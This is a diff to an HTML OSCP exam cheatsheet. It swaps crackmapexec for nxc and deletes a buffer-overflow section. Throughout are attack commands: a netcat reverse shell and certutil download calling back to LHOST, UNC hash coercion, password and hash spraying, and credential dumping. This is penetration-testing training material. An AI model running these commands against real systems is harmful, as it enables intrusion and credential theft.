@@ -514,11 +514,10 @@
     <li><a href="#s8">Password Attacks</a></li>
     <li><a href="#s9">File Transfer Cheatsheet</a></li>
     <li><a href="#s10">Shells &amp; Upgrades</a></li>
-    <li><a href="#s11">Exploit Development (BOF Reference)</a></li>
-    <li><a href="#s12">Common CVEs &amp; Exploits</a></li>
-    <li><a href="#s13">Exam Day Tips</a></li>
-    <li><a href="#s14">Proof Collection Checklist</a></li>
-    <li><a href="#s15">Quick Reference Card</a></li>
+    <li><a href="#s11">Common CVEs &amp; Exploits</a></li>
+    <li><a href="#s12">Exam Day Tips</a></li>
+    <li><a href="#s13">Proof Collection Checklist</a></li>
+    <li><a href="#s14">Quick Reference Card</a></li>
   </ol>
 </nav>
 
@@ -565,7 +564,7 @@
   <h3>Time Strategy (23h 45min)</h3>
   <pre data-lang="timeline"><code>Hour 0-0:30    Setup: VPN, loot dirs, /etc/hosts, nmap ALL targets in parallel
 Hour 0:30-4    ATTACK AD SET FIRST — 40 pts guaranteed path
-               ├── Enumerate with provided creds (BloodHound, CME, LDAP)
+               ├── Enumerate with provided creds (BloodHound, nxc, LDAP)
                ├── Low-hanging fruit: Kerberoast, AS-REP, descriptions, shares
                ├── Lateral MS01 → MS02 → DC
                └── Screenshot every proof immediately
@@ -694,17 +693,17 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
   <pre data-lang="bash"><code># Unauthenticated:
 smbclient -L //&lt;TARGET_IP&gt; -N
 smbmap -H &lt;TARGET_IP&gt; -u '' -p ''
-crackmapexec smb &lt;TARGET_IP&gt; -u '' -p '' --shares
+nxc smb &lt;TARGET_IP&gt; -u '' -p '' --shares
 nmap --script smb-vuln* -p 445 &lt;TARGET_IP&gt;
 
 # Authenticated:
-crackmapexec smb &lt;TARGET_IP&gt; -u user -p pass --shares --users --groups --pass-pol
+nxc smb &lt;TARGET_IP&gt; -u user -p pass --shares --users --groups --pass-pol
 smbmap -H &lt;TARGET_IP&gt; -u user -p pass -R
 smbclient //&lt;TARGET_IP&gt;/share -U 'user%pass'
 
 # Download all files recursively:
 smbclient //&lt;TARGET_IP&gt;/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'
-crackmapexec smb &lt;TARGET_IP&gt; -u user -p pass -M spider_plus</code></pre>
+nxc smb &lt;TARGET_IP&gt; -u user -p pass -M spider_plus</code></pre>
 
   <h3>SNMP Enumeration</h3>
   <pre data-lang="bash"><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;TARGET_IP&gt;
@@ -1015,7 +1014,7 @@ type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.tx
 
 # Stored credentials:
 cmdkey /list
-runas /savecred /user:Administrator "C:\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd"
+runas /savecred /user:Administrator "C:\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd"  # needs ncat/ncat build
 
 # Unquoted service paths:
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"</code></pre>
@@ -1029,8 +1028,8 @@ lsadump::lsa /patch
 
 # Remote SAM dump:
 secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
-netexec smb &lt;TARGET_IP&gt; -u user -p pass --sam
-netexec smb &lt;TARGET_IP&gt; -u user -p pass -M lsassy</code></pre>
+nxc smb &lt;TARGET_IP&gt; -u user -p pass --sam
+nxc smb &lt;TARGET_IP&gt; -u user -p pass -M lsassy</code></pre>
 
   <a href="#top" class="back-top">↑ Back to top</a>
 </section>
@@ -1051,7 +1050,7 @@ netexec smb &lt;TARGET_IP&gt; -u user -p pass -M lsassy</code></pre>
         │
         ▼
 <span class="leaf">Phase 1: RAPID AD ENUMERATION</span>
-    BloodHound + CME + LDAP + PowerView
+    BloodHound + nxc + LDAP + PowerView
         │
         ▼
 <span class="leaf">Phase 2: QUICK WINS (all simultaneously)</span>
@@ -1087,8 +1086,8 @@ bloodhound-python -u stephanie -p 'Password123' \
 #   "Computers with Unconstrained Delegation"
 #   "Find Principals with DCSync Rights"
 
-# CME domain recon:
-crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' \
+# nxc domain recon:
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' \
     --shares --users --groups --pass-pol
 
 # Passwords in description field (VERY COMMON in OSCP):
@@ -1119,8 +1118,8 @@ hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
 
   <h3>GPP / SYSVOL</h3>
-  <pre data-lang="bash"><code>crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
-crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
+  <pre data-lang="bash"><code>nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
 gpp-decrypt &lt;CPASSWORD_VALUE&gt;</code></pre>
 
   <h3>ADCS — Active Directory Certificate Services</h3>
@@ -1226,14 +1225,14 @@ ldapsearch -x -H ldap://192.168.x.100 \
     <strong>Rule:</strong> Every credential found anywhere must be tried on every service everywhere. Password reuse wins OSCP.
   </div>
   <pre data-lang="bash"><code># Any creds found → spray everything:
-netexec smb 192.168.x.0/24 -u user -p pass --continue-on-success
-netexec winrm 192.168.x.0/24 -u user -p pass --continue-on-success
-netexec mssql 192.168.x.0/24 -u user -p pass --continue-on-success
-netexec rdp 192.168.x.0/24 -u user -p pass --continue-on-success
-netexec ssh 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc smb 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc winrm 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc mssql 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc rdp 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc ssh 192.168.x.0/24 -u user -p pass --continue-on-success
 
 # After getting any hash → spray hash across subnet:
-netexec smb 192.168.x.0/24 -u Administrator -H &lt;NTLM_HASH&gt; \
+nxc smb 192.168.x.0/24 -u Administrator -H &lt;NTLM_HASH&gt; \
     --local-auth --continue-on-success | grep "+"</code></pre>
 
   <h3>ADCS + AD Attack Decision Tree</h3>
@@ -1277,10 +1276,10 @@ psexec.py -k -no-pass corp.local/user@&lt;TARGET_FQDN&gt;</code></pre>
 
   <h3>Lateral Movement — Pass-the-Hash</h3>
   <pre data-lang="bash"><code># Verify hash:
-crackmapexec smb &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt; --local-auth
+nxc smb &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt; --local-auth
 
 # Spray hash across subnet:
-crackmapexec smb 10.10.10.0/24 -u Administrator -H &lt;NTLM_HASH&gt; \
+nxc smb 10.10.10.0/24 -u Administrator -H &lt;NTLM_HASH&gt; \
     --local-auth --continue-on-success | grep "+"
 
 # Get shell:
@@ -1394,7 +1393,7 @@ EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];</
 
   <h3>Step 6: UNC Path Injection → Hash Capture</h3>
   <pre data-lang="bash"><code># Setup Responder:
-sudo responder -I tun0 -v
+sudo responder -I tun0 -wv
 
 # In MSSQL — trigger UNC auth:
 EXEC xp_dirtree '\\&lt;LHOST&gt;\share';
@@ -1533,11 +1532,11 @@ hashcat -m 1800 shadow.txt rockyou.txt</code></pre>
 
   <h3>NTLM Capture &amp; Relay</h3>
   <pre data-lang="bash"><code># Capture (Responder):
-sudo responder -I tun0 -dwv
+sudo responder -I tun0 -wv
 hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt
 
 # Check signing:
-netexec smb &lt;SUBNET&gt;/24 --gen-relay-list unsigned.txt
+nxc smb &lt;SUBNET&gt;/24 -u '' -p '' --gen-relay-list unsigned.txt
 
 # Relay:
 sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
@@ -1552,8 +1551,8 @@ hydra -l admin -P rockyou.txt &lt;TARGET_IP&gt; http-post-form \
     "/login.php:username=^USER^&amp;password=^PASS^:Invalid"
 
 # SMB spray (check lockout first!):
-crackmapexec smb &lt;TARGET_IP&gt; -u stephanie -p 'Password123' --pass-pol
-crackmapexec smb &lt;TARGET_IP&gt; -u domain_users.txt -p 'Password123' --continue-on-success</code></pre>
+nxc smb &lt;TARGET_IP&gt; -u stephanie -p 'Password123' --pass-pol
+nxc smb &lt;TARGET_IP&gt; -u domain_users.txt -p 'Password123' --continue-on-success</code></pre>
 
   <a href="#top" class="back-top">↑ Back to top</a>
 </section>
@@ -1578,7 +1577,7 @@ certutil -urlcache -split -f http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
 bitsadmin /transfer job /download /priority normal http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
 
 # SMB (setup on attacker):
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
+impacket-smbserver share . -smb2support
 copy \\&lt;LHOST&gt;\share\file.exe C:\Temp\</code></pre>
 
   <h3>Windows → Linux (Exfil)</h3>
@@ -1650,43 +1649,6 @@ script /dev/null -c bash
 <section class="section" id="s11">
   <div class="section-header">
     <span class="section-num">11</span>
-    <h2>Exploit Development (BOF Reference)</h2>
-  </div>
-
-  <h3>Windows x86 Stack Buffer Overflow</h3>
-  <pre data-lang="python"><code># Step 1: Find crash size (fuzz in increments)
-# Step 2: Exact offset
-msf-pattern_create -l &lt;CRASH_LENGTH&gt;
-# Immunity: !mona findmsp -distance &lt;CRASH_LENGTH&gt;
-
-# Step 3: Verify EIP control
-# payload = b"A" * OFFSET + b"B" * 4 + b"C" * (2000 - OFFSET - 4)
-# EIP = 42424242 ✓
-
-# Step 4: Bad chars
-# !mona bytearray -b "\x00"
-# Send all chars; compare dump
-# !mona compare -f C:\mona\bytearray.bin -a &lt;ESP_ADDRESS&gt;
-
-# Step 5: JMP ESP
-# !mona jmp -r esp -cpb "\x00\x0a\x0d"
-# Pick no-ASLR/DEP/SafeSEH module address
-
-# Step 6: Shellcode
-msfvenom -p windows/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 \
-    -f python -b "\x00\x0a\x0d" EXITFUNC=thread
-
-# Step 7: Final exploit
-from struct import pack
-payload = b"A" * offset + pack("&lt;I", jmp_esp) + b"\x90" * 16 + shellcode</code></pre>
-
-  <a href="#top" class="back-top">↑ Back to top</a>
-</section>
-
-<!-- ═══════════════════ S12 ═══════════════════ -->
-<section class="section" id="s12">
-  <div class="section-header">
-    <span class="section-num">12</span>
     <h2>Common CVEs &amp; Exploits</h2>
   </div>
 
@@ -1719,10 +1681,10 @@ searchsploit -u                       # Update DB</code></pre>
   <a href="#top" class="back-top">↑ Back to top</a>
 </section>
 
-<!-- ═══════════════════ S13 ═══════════════════ -->
-<section class="section" id="s13">
+<!-- ═══════════════════ S12 ═══════════════════ -->
+<section class="section" id="s12">
   <div class="section-header">
-    <span class="section-num">13</span>
+    <span class="section-num">12</span>
     <h2>Exam Day Tips</h2>
   </div>
 
@@ -1797,10 +1759,10 @@ type C:\Users\Administrator\Desktop\proof.txt &amp; whoami &amp; hostname &amp; 
   <a href="#top" class="back-top">↑ Back to top</a>
 </section>
 
-<!-- ═══════════════════ S14 ═══════════════════ -->
-<section class="section" id="s14">
+<!-- ═══════════════════ S13 ═══════════════════ -->
+<section class="section" id="s13">
   <div class="section-header">
-    <span class="section-num">14</span>
+    <span class="section-num">13</span>
     <h2>Proof Collection Checklist</h2>
   </div>
 
@@ -1855,10 +1817,10 @@ dir /s /b C:\*.txt 2&gt;nul | findstr "local\|proof"</code></pre>
   <a href="#top" class="back-top">↑ Back to top</a>
 </section>
 
-<!-- ═══════════════════ S15 ═══════════════════ -->
-<section class="section" id="s15">
+<!-- ═══════════════════ S14 ═══════════════════ -->
+<section class="section" id="s14">
   <div class="section-header">
-    <span class="section-num">15</span>
+    <span class="section-num">14</span>
     <h2>Quick Reference Card</h2>
   </div>
 
@@ -1879,10 +1841,10 @@ wmiexec.py dom/user@&lt;IP&gt; -hashes :&lt;NTLM_HASH&gt;
 GetUserSPNs.py dom/user:pass -dc-ip &lt;DC_IP&gt; -request   # Kerberoast
 GetNPUsers.py dom/user:pass -dc-ip &lt;DC_IP&gt; -request    # AS-REP
 secretsdump.py dom/user:pass@&lt;DC_IP&gt; -just-dc          # DCSync
-getST.py -spn cifs/&lt;FQDN&gt; -impersonate Admin dom/user:pass  # S4U2Self
+getST.py -spn cifs/&lt;FQDN&gt; -impersonate Admin dom/user:pass -dc-ip &lt;DC_IP&gt;  # S4U2Self
 ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;SID&gt; -domain dom Admin</code></pre>
 
-  <h3>netexec (nxc) Cheatsheet</h3>
+  <h3>nxc (NetExec) Cheatsheet</h3>
   <pre data-lang="bash"><code>nxc smb &lt;IP&gt; -u user -p pass                            # Test creds
 nxc smb &lt;IP&gt; -u user -H &lt;NTLM_HASH&gt;                    # PTH
 nxc smb &lt;SUBNET&gt;/24 -u user -p pass --continue-on-success
